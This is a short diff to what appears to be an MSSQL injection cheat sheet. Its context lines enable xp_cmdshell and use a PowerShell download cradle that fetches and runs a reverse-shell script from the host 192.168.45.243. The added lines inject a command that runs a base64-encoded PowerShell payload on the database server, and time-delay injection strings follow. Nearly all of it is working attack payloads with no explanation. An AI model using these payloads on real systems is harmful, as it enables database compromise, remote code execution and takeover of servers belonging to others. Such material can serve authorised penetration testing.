@@ -76,6 +76,9 @@ sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell'
 EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.243:80/rev.ps1") | powershell -noprofile'
 # Run reverse shell
 
+a'; EXEC xp_cmdshell 'powershell -e JABjAGwAaQBl...QAoACkA' --
+# run base64 encoded payload on server
+
 ### Time Delay
 WAITFOR DELAY '0:0:10'
 a'; WAITFOR DELAY '0:0:4'-- 
